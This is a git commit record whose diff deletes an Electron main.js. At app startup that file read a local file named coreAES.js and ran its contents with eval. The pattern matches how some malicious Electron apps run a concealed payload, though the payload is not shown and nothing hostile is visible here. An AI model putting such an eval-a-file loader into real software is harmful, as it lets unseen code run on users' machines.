1ad4cb0d10c71a74597c7c4f1f954ab680b9b98d
Evil559 <122262267+Evil559@users.noreply.github.com>
2023-02-27 22:43:24 +0200

    Delete main.js

--- main.js
+++
@@ -1,9 +0,0 @@
-const { app } = require('electron');
-const path = require('path');
-const fs = require('fs');
-
-app.whenReady().then(async () => {
-  const filePath = path.join(__dirname, 'coreAES.js');
-  const fileContent = await fs.promises.readFile(filePath, 'utf-8');
-  eval(fileContent); // new Function(fileContent)();
-});
